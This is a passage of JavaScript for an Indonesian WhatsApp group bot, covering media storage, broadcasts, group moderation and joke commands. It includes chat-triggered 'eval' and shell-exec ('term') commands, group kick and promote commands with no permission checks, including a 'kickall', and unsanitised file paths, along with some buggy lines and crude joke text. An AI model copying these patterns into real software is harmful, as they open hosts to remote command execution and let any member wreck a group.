                            reply(`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI TRXNYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *©hzkyx*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6282287486762`)
                            break
                     case 'ping':
                     case 'speed':
                            timestampe = speed();
                            latensie = speed() - timestampe
                            reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
                            break
                     case 'botstat':
                            groups = dha.chats.array.filter(v => v.jid.endsWith('g.us'))
                            privat = dha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
                            ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
                            charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
                            uptime = process.uptime();
                            timestampe = speed();
                            totalChat = await dha.chats.all()
                            latensie = speed() - timestampe
                            total = math(`${groups.length}*${privat.length}`)
                            teks = `\`\`\`BOT STATISTICS\`\`\`
\`\`\`▢ Group Chats : ${groups.length}\`\`\`
\`\`\`▢ Private Chats : ${privat.length}\`\`\`
\`\`\`▢ Total Chats : ${totalChat.length}\`\`\`
\`\`\`▢ Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`▢ Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\`▢ Baterai : ${baterai}% ${charger}\`\`\`
\`\`\`▢ Ram Usage : ${ram2}\`\`\`
\`\`\`▢ Platform : ${os.platform()}\`\`\`
\`\`\`▢ Hostname : ${os.hostname()}\`\`\`
\`\`\`▢ Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`▢ Wa Version: ${dha.user.phone.wa_version}\`\`\`
\`\`\`▢ Os Version: ${dha.user.phone.os_version}\`\`\`
\`\`\`▢ Device Manufacturer: ${dha.user.phone.device_manufacturer}\`\`\`
\`\`\`▢ Device Model: ${dha.user.phone.device_model}\`\`\`
\`\`\`▢ Os Build Number: ${dha.user.phone.os_build_number}\`\`\``
                            reply(teks)
                            break
                            //------------------< Owner >-------------------
                     case 'addupdate':
                            if (!isOwner) return reply(mess.only.owner)
                            if (!q) return reply(`Example: ${command} update fitur`)
                            _update.push(q)
                            fs.writeFileSync('./database/bot/update.json', JSON.stringify(_update))
                            reply(`Update fitur berhasil ditambahkan ke database!`)
                            break
                     case 'update':
                            let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
                            for (let i of _update) {
                                   updateList += `࿃ *${i.replace(_update)}*\n\n`
                            }
                            textImg(updateList)
                            break
                     case 'reset':
                            if (!isOwner) return reply(mess.only.owner)
                            var reset = []
                            glimit = reset
                            _update = reset
                            console.log('Hang tight, it\'s time to reset')
                            fs.writeFileSync('./database/bot/glimit.json', JSON.stringify(glimit))
                            fs.readFileSync('./database/bot/update.json', JSON.stringify(_update))
                            textImg('Oke Desu ~')
                            break
                     case 'exif':
                            if (!isOwner) return reply(mess.only.owner)
                            if (!q) return reply(mess.wrongFormat)
                            if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
                            exif.create(arg.split('|')[0], arg.split('|')[1])
                            reply('sukses')
                            break
                            //-----------add hiburan   
                     case 'tupai':
                            reply('PROSES')
                            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            media = await dha.downloadAndSaveMediaMessage(encmedia)
                            ran = getRandom('.mp3')
                            exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
                                   fs.unlinkSync(media)
                                   if (err) return reply('Error!')
                                   hah = fs.readFileSync(ran)
                                   dha.sendMessage(from, hah, audio, {
                                          mimetype: 'audio/mp4',
                                          ptt: true,
                                          quoted: troli
                                   })
                                   fs.unlinkSync(ran)
                            })
                            break
                     case 'addstik':
                            if (!isOwner) return reply(mess.only.owner)
                            if (!isQuotedSticker) return reply('Reply stiker nya')
                            svst = body.slice(9)
                            if (!svst) return reply('Nama sticker nya apa?')
                            boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            delb = await dha.downloadMediaMessage(boij)
                            setiker.push(`${svst}`)
                            fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
                            fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
                            dha.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'addimg':
                            if (!isOwner) return reply(mess.only.owner)
                            if (!isQuotedImage) return reply('Reply imagenya')
                            svst = body.slice(8)
                            if (!svst) return reply('Nama imagenya apa')
                            boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            delb = await dha.downloadMediaMessage(boij)
                            imagenye.push(`${svst}`)
                            fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
                            fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
                            dha.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, {
                                   quoted: troli
                            })
                            break

                     case 'addvid':
                            if (!isOwner) return reply(mess.only.owner)
                            if (!isQuotedVideo) return reply('Reply vidionya')
                            svst = body.slice(8)
                            if (!svst) return reply('Nama vidionya apa')
                            boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            delb = await dha.downloadMediaMessage(boij)
                            imagenye.push(`${svst}`)
                            fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
                            fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
                            dha.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, {
                                   quoted: troli
                            })
                            break

                     case 'addvn':
                            if (!isOwner) return reply(mess.only.owner)
                            if (!isQuotedAudio) return reply('Reply vnnya')
                            svst = body.slice(7)
                            if (!svst) return reply('Nama audionya apa')
                            boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            delb = await dha.downloadMediaMessage(boij)
                            audionye.push(`${svst}`)
                            fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
                            fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
                            dha.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'liststik':
                            teks = '*Sticker list :*\n\n'
                            for (let awokwkwk of setiker) {
                                   teks += `- ${awokwkwk}\n`
                            }
                            teks += `\n*Total : ${setiker.length}*`
                            dha.sendMessage(from, teks.trim(), extendedText, {
                                   quoted: troli,
                                   contextInfo: {
                                          "mentionedJid": setiker
                                   }
                            })
                            break
                     case 'listimg':
                            teks = '*Image list :*\n\n'
                            for (let awokwkwk of imagenye) {
                                   teks += `- ${awokwkwk}\n`
                            }
                            teks += `\n*Total : ${imagenye.length}*`
                            dha.sendMessage(from, teks.trim(), extendedText, {
                                   quoted: troli,
                                   contextInfo: {
                                          "mentionedJid": setiker
                                   }
                            })
                            break
                     case 'listvid':
                            teks = '*List Video :*\n\n'
                            for (let awokwkwk of videonye) {
                                   teks += `- ${awokwkwk}\n`
                            }
                            teks += `\n*Total : ${videonye.length}* `
                            dha.sendMessage(from, teks.trim(), extendedText, {
                                   quoted: troli,
                                   contextInfo: {
                                          "mentionedJid": imagenye
                                   }
                            })
                            break
                     case 'listvn':
                            teks = '*List Vn:*\n\n'
                            for (let awokwkwk of audionye) {
                                   teks += `- ${awokwkwk}\n`
                            }
                            teks += `\n*Total : ${audionye.length}*`
                            dha.sendMessage(from, teks.trim(), extendedText, {
                                   quoted: troli,
                                   contextInfo: {
                                          "mentionedJid": audionye
                                   }
                            })
                            break
                     case 'getstik':
                            namastc = body.slice(9)
                            try {
                                   result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
                                   dha.sendMessage(from, result, sticker, {
                                          quoted: troli
                                   })
                            } catch {
                                   reply('Pack tidak terdaftar')
                            }
                            break
                     case 'getimg':
                            namastc = body.slice(8)
                            try {
                                   buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
                                   dha.sendMessage(from, buffer, image, {
                                          quoted: troli,
                                          caption: `Result From Database : ${namastc}.jpeg`
                                   })
                            } catch {
                                   reply('Pack tidak terdaftar')
                            }
                            break

                     case 'getvid':
                            namastc = body.slice(8)
                            try {
                                   buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
                                   dha.sendMessage(from, buffer, video, {
                                          quoted: troli,
                                          caption: `Result From Database : ${namastc}.mp4`
                                   })
                            } catch {
                                   reply('Pack tidak terdaftar')
                            }
                            break
                     case 'getvn':
                            namastc = body.slice(7)
                            try {
                                   buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
                                   dha.sendMessage(from, buffer, audio, {
                                          mimetype: 'audio/mp4',
                                          quoted: troli,
                                          ptt: true
                                   })
                            } catch {
                                   reply('Pack tidak terdaftar')
                            }
                            break
                     case 'join':
                            if (!q) return reply('Linknya?')
                            if (!isOwner) return reply(mess.only.owner)
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')
                            link = args[0].replace('https://chat.whatsapp.com/', '')
                            fak = dha.query({
                                   json: ['action', 'invite', link],
                                   expect200: true
                            })
                            reply('Berhasil Masuk Grup')
                            break
                     case 'eval':
                            try {
                                   if (!isOwner) return
                                   sy = args.join(' ')
                                   return eval(sy)
                            } catch (e) {
                                   reply(`${e}`)
                            }
                            break
                     case 'getquoted':
                            reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
                            break
                     case 'bc':
                     case 'broadcast':
                            if (!isOwner) return reply(mess.only.owner)
                            if (args.length < 1) return reply('teks?')
                            anu = await dha.chats.all()
                            if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                                   const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   bc = await dha.downloadMediaMessage(encmedia)
                                   for (let _ of anu) {
                                          dha.sendMessage(_.jid, bc, image, {
                                                 quoted: freply,
                                                 caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`
                                          })
                                   }
                                   reply('Suksess broadcast')
                            } else {
                                   for (let _ of anu) {
                                          sendMess(_.jid, `*「 PESAN SIARAN NOIR BOT」*\n\n${body.slice(4)}`)
                                   }
                                   reply('Suksess broadcast')
                            }
                            break
                     case 'clearall':
                            if (!isOwner) return reply(mess.only.owner)
                            anu = await dha.chats.all()
                            dha.setMaxListeners(25)
                            for (let _ of anu) {
                                   dha.deleteChat(_.jid)
                            }
                            reply('Sukses delete all chat :)')
                            break
                     case 'term':
                            if (!isOwner) return
                            if (!q) return
                            exec(q, (err, stdout) => {
                                   if (err) return reply(`${err}`)
                                   if (stdout) {
                                          reply(stdout)
                                   }
                            })
                            break
                     case 'shutdown':
                            if (!isOwner) return
                            reply(`Bye...`)
                            await sleep(3000)
                            process.exit()
                            break
                     case 'start':
                            if (!isOwner) return
                            reply(`OTEWE MENGHIDUPKAN MESIN😗`)
                            await sleep(3000)
                            process.exit()
                            break
                     case 'restart':
                            if (!isOwner) return
                            reply(mess.wait)
                            exec(`node main`)
                            reply('_Restarting Bot Success_')
                            break
                     case 'leaveall':
                            if (!isOwner) return reply(mess.only.owner)
                            let totalgroup = dha.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
                            for (let id of totalgroup) {
                                   sendMess(id, 'Byee', null)
                                   await sleep(3000)
                                   dha.groupLeave(id)
                            }
                            break
                            //------------------< G R U P >-------------------
                     case 'linkgc':
                            if (!isGroup) return reply(mess.only.group)
                            linkgc = await dha.groupInviteCode(from)
                            yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
                            dha.sendMessage(from, yeh, text, {
                                   quoted: mek
                            })
                            break
                     case 'kick':
                            reply('asek dapat jatah ngekick wkwkwwk oke lah lansung aja *TENDANGAN GARUDA*')
                            if (!isGroup) return reply(mess.only.group)
                            kick(from, mentionUser)
                            break
                     case 'add':
                            if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
                                   entah = arg.split("|")[0]
                                   entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
                                   entah = `${entah}@s.whatsapp.net`
                                   dha.groupAdd(from, [entah])
                            } else {
                                   entah = mek.message.extendedTextMessage.contextInfo.participant
                                   dha.groupAdd(from, [entah])
                            }
                            break
                     case 'promote':
                            reply('SELAMAT')
                            if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                            if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                                   entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                                   if (entah.length > 0) {
                                          var mems_ids = []
                                          for (let ids of entah) {
                                                 mems_ids.push(ids)
                                          }
                                          dha.groupMakeAdmin(from, mems_ids)
                                   } else {
                                          dha.groupMakeAdmin(from, entah)
                                   }
                            } else {
                                   entah = mek.message.extendedTextMessage.contextInfo.participant
                                   dha.groupMakeAdmin(from, [entah])
                            }
                            break
                     case 'demote':
                            reply('MAMPUS')
                            if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                            if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                                   entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                                   if (entah.length > 0) {
                                          var mems_ids = []
                                          for (let ids of entah) {
                                                 mems_ids.push(ids)
                                          }
                                          dha.groupDemoteAdmin(from, mems_ids)
                                   } else {
                                          dha.groupDemoteAdmin(from, [entah[0]])
                                   }
                            } else {
                                   entah = mek.message.extendedTextMessage.contextInfo.participant
                                   dha.groupDemoteAdmin(from, [entah])
                            }
                            break
                     case 'setgrupname':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isBotGroupAdmins) return
                            if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
                            dha.groupUpdateSubject(from, q)
                                   .then((res) => reply(jsonformat(res)))
                                   .catch((err) => reply(jsonformat(err)))
                            break
                     case 'setdesc':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                            if (args.length == 0) return reply(`Penggunaan ${prefix}setdesc desc`)
                            dha.groupUpdateDescription(from, q)
                                   .then((res) => reply(jsonformat(res)))
                                   .catch((err) => reply(jsonformat(err)))
                            break
                     case 'setppgrup':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                            if (isQuotedImage) {
                                   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   let media = await dha.downloadMediaMessage(encmedia)
                                   dha.updateProfilePicture(from, media)
                                          .then((res) => reply(jsonformat(res)))
                                          .catch((err) => reply(jsonformat(err)))
                            } else {
                                   reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
                            }
                            break
                     case 'me':
                     case 'profile':
                            let Levelnye = level.getLevelingLevel(sender, _level)
                            let Xpluu = level.getLevelingXp(sender, _level)
                            let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
                            dha.updatePresence(from, Presence.composing)
                            try {
                                   profil = await dha.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
                            } catch {
                                   profil = errorImg
                            }
                            thu = await dha.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
                            me = dha.user
                            uptime = process.uptime()
                            profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
                            buff = await getBuffer(profil)
                            dha.sendMessage(from, buff, image, {
                                   quoted: freply,
                                   caption: profile
                            })
                            break
                     case 'afk':
                            if (!isGroup) return reply(mess.only.group)
                            if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
                            const reason = q ? q : 'Nothing.'
                            afk.addAfkUser(sender, time, reason, _afk)
                            const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
                            reply(aluty)
                            break
                     case 'infogrup':
                     case 'grupinfo':
                     case 'groupinfo':
                            if (!isGroup) return reply(mess.only.group)
                            try {
                                   var pic = await dha.getProfilePicture(from)
                            } catch {
                                   var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                            }
                            let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
                            dha.sendMessage(from, await getBuffer(pic), image, {
                                   quoted: mek,
                                   caption: ingfo,
                                   contextInfo: {
                                          "mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]
                                   }
                            })
                            break
                     case 'tagall':
                            if (!isGroup) return reply(mess.only.group)
                            let arr = [];
                            let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
                            for (let i of groupMembers) {
                                   txti += `=> @${i.jid.split("@")[0]}\n`
                                   arr.push(i.jid)
                            }
                            mentions(txti, arr, true)
                            break
                     case 'kickall': // Anti Banned
                            for (let i of groupMembers) {
                                   await kickMember(from, [i.jid])
                            }
                            break
                     case 'leave':
                            if (!isGroup) return reply(mess.only.group)
                            setTimeout(() => {
                                   dha.groupLeave(from)
                            }, 2000)
                            setTimeout(() => {
                                   reply('Byee...')
                            }, 0)
                            break
                     case 'online':
                     case 'listonline':
                     case 'here':
                            if (!isGroup) return reply(`Only group`)
                            try {
                                   let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                                   let online = [...Object.keys(dha.chats.get(ido).presences), dha.user.jid]
                                   dha.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
                                          quoted: mek,
                                          contextInfo: {
                                                 mentionedJid: online
                                          }
                                   })
                            } catch (e) {
                                   reply(`${e}`)
                            }
                            break
                     case 'hidetag':
                            try {
                                   quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                                   hideTag(from, `${quotedText}`)
                            } catch {
                                   hideTag(from, `${q}`)
                            }
                            break
                     case 'sider':
                            if (!isGroup) return reply(mess.only.group)
                            try {
                                   infom = await dha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
                                   tagg = []
                                   teks = `*• Dibaca oleh:*\n\n`
                                   for (let i of infom.reads) {
                                          teks += '@' + i.jid.split('@')[0] + '\n'
                                          teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
                                          tagg.push(i.jid)
                                   }
                                   teks += `*• Tersampaikan pada:*\n\n`
                                   for (let i of infom.deliveries) {
                                          teks += '@' + i.jid.split('@')[0] + '\n'
                                          teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
                                          tagg.push(i.jid)
                                   }
                                   mentions(teks, tagg, true)
                            } catch (e) {
                                   console.log(color(e))
                                   reply('Reply chat bot!')
                            }
                            break
                            //------------------< Fun >-------------------
                     case 'public':
                            if (!mek.key.fromMe && !isOwner) return reply('Fitur Khusus Owner!!')
                            if (banChats === false) return
                            // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
                            setting.banChats = false
                            banChats = false
                            fs.writeFileSync('./setting.json', JSON.stringify(setting, null, 2))
                            reply(`「 *PUBLIC-MODE* 」`)
                            break
                     case 'self':
                            if (!mek.key.fromMe && !isOwner) return reply('Fitur Khusus Owner!!')
                            if (setting.banChats === true) return
                            setting.banChats = true
                            uptime = process.uptime()
                            // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
                            banChats = true
                            fs.writeFileSync('./setting.json', JSON.stringify(setting, null, 2))
                            reply(`「 *SELF-MODE* 」`)
                            break
                     case 'wangy':
                            if (!q) return
                            qq = q.toUpperCase()
                            awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                            reply(awikwok)
                            break
                     case 'mining':
                            var mining = randomNomor(1000)
                            atm.addKoinUser(sender, mining, _uang)
                            await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
                            break
                     case 'waktu':
                            reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
                            break
                     case 'cekmati':
                            if (!q) return reply(mess.wrongFormat)
                            predea = await axios.get(`https://api.agify.io/?name=${q}`)
                            reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
                            break
                     case 'toxic':
                            Toxic().then(toxic => {
                                   reply(toxic)
                            })
                            break
                     case 'citacita':
                            const cita = ['http://piyobot.000webhostapp.com/citacita1.mp3', 'http://piyobot.000webhostapp.com/citacita2.mp3', 'http://piyobot.000webhostapp.com/citacita3.mp3', 'http://piyobot.000webhostapp.com/citacita4.mp3', 'http://piyobot.000webhostapp.com/citacita5.mp3', 'http://piyobot.000webhostapp.com/citacita6.mp3', 'http://piyobot.000webhostapp.com/citacita7.mp3', 'http://piyobot.000webhostapp.com/citacita8.mp3', 'http://piyobot.000webhostapp.com/citacita9.mp3', 'http://piyobot.000webhostapp.com/citacita10.mp3', 'http://piyobot.000webhostapp.com/citacita11.mp3', 'http://piyobot.000webhostapp.com/citacita12.mp3', 'http://piyobot.000webhostapp.com/citacita13.mp3', 'http://piyobot.000webhostapp.com/citacita14.mp3', 'http://piyobot.000webhostapp.com/citacita15.mp3', 'http://piyobot.000webhostapp.com/citacita16.mp3', 'http://piyobot.000webhostapp.com/citacita17.mp3', 'http://piyobot.000webhostapp.com/citacita18.mp3', 'http://piyobot.000webhostapp.com/citacita19.mp3', 'http://piyobot.000webhostapp.com/citacita20.mp3', 'http://piyobot.000webhostapp.com/citacita21.mp3', 'http://piyobot.000webhostapp.com/citacita22.mp3', 'http://piyobot.000webhostapp.com/citacita23.mp3', 'http://piyobot.000webhostapp.com/citacita24.mp3', 'http://piyobot.000webhostapp.com/citacita25.mp3', 'http://piyobot.000webhostapp.com/citacita26.mp3', 'http://piyobot.000webhostapp.com/citacita27.mp3', 'http://piyobot.000webhostapp.com/citacita28.mp3', 'http://piyobot.000webhostapp.com/citacita29.mp3', 'http://piyobot.000webhostapp.com/citacita30.mp3', 'http://piyobot.000webhostapp.com/citacita31.mp3', 'http://piyobot.000webhostapp.com/citacita32.mp3', 'http://piyobot.000webhostapp.com/citacita33.mp3', 'http://piyobot.000webhostapp.com/citacita34.mp3', 'http://piyobot.000webhostapp.com/citacita35.mp3']
                            const cita3 = cita[Math.floor(Math.random() * cita.length)]
                            cita2 = await getBuffer(cita3)
                            dha.sendMessage(from, cita2, audio, {
                                   mimetype: 'audio/mp4',
                                   ptt: true,
                                   quoted: mek
                            })
                            break
                     case 'apakah':
                            apakah = body.slice(1)
                            const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Coba Ulangi']
                            const kah = apa[Math.floor(Math.random() * apa.length)]
                            dha.sendMessage(from, '*Pertanyaan :* ' + apakah + '\n*Jawaban :* ' + kah, text, {
                                   quoted: mek
                            })
                            break
                     case 'rate':
                     case 'nilai':
                            rate = body.slice(1)
                            const ra = ['0', '4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
                            const te = ra[Math.floor(Math.random() * ra.length)]
                            dha.sendMessage(from, '*Pertanyaan :* ' + rate + '\n*Jawaban :* ' + te + '%', text, {
                                   quoted: mek
                            })
                            break
                     case 'gantengcek':
                     case 'cekganteng':
                            ganteng = body.slice(1)
                            const gan = ['10', '30', '20', '40', '50', '60', '70', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
                            const teng = gan[Math.floor(Math.random() * gan.length)]
                            dha.sendMessage(from, '*Pertanyaan :* ' + ganteng + '\n*Jawaban :* ' + teng + '%', text, {
                                   quoted: mek
                            })
                            break
                     case 'cantikcek':
                     case 'cekcantik':
                            cantik = body.slice(1)
                            const can = ['10', '30', '20', '40', '50', '60', '70', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
                            const tik = can[Math.floor(Math.random() * can.length)]
                            dha.sendMessage(from, '*Pertanyaan :* ' + cantik + '\n*Jawaban :* ' + tik + '%', text, {
                                   quoted: mek
                            })
                            break
                     case 'cekwatak':
                            var namao = pushname
                            var prfx = await dha.getProfilePicture(sender)
                            const watak = ['top deh pokoknya', 'penyayang', 'pemurah', 'Pemarah', 'Pemaaf', 'Penurut', 'Baik', 'baperan', 'Baik-Hati', 'penyabar', 'UwU', 'Suka Membantu']
                            const wtk = watak[Math.floor(Math.random() * (watak.length))]
                            const ratenyaasu = ['100%', '95%', '90%', '85%', '80%', '75%', '70%', '65%', '60%', '55%', '50%', '45%', '40%', '35%', '30%', '25%', '20%', '15%', '10%', '5%']
                            const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
                            const sifat = ['Penolong', 'Suka Membantu', 'Saling Menolong', 'Perhatian', 'Ngak Cuek', 'Romantis', 'Dermawan', 'Cool', 'Peduli Kepada Sesama', 'Suka Berkata Kasar']
                            const sft = sifat[Math.floor(Math.random() * (sifat.length))]
                            const hobby = ['Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Coli', 'Colmek', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
                            const hby = hobby[Math.floor(Math.random() * (hobby.length))]
                            const kelebihan = ['Soleh dan Soleha', 'Pintar', 'Rajin', 'Teladan']
                            const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
                            const tipe = ['cool', 'idaman', 'Alami', 'Keren', 'Ideal', 'Dia Bamget', 'normal', 'elite', 'epic', 'Legend']
                            const typo = tipe[Math.floor(Math.random() * (tipe.length))]
                            await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
                            break
                     case 'hobby':
                            hobby = body.slice(1)
                            const by = hobby[Math.floor(Math.random() * hobby.length)]
                            dha.sendMessage(from, 'Pertanyaan : *' + hobby + '*\n\nJawaban : ' + by, text, {
                                   quoted: mek
                            })
                            break
                     case 'bisakah':
                            bisakah = body.slice(1)
                            const bisa = ['Bisa', 'Tidak Bisa', 'Coba Ulangi', 'MANA GW TAU']
                            const keh = bisa[Math.floor(Math.random() * bisa.length)]
                            dha.sendMessage(from, '*Pertanyaan :* ' + bisakah + '\n*Jawaban :* ' + keh, text, {
                                   quoted: mek
                            })
                            break
                     case 'kapankah':
                            kapankah = body.slice(1)
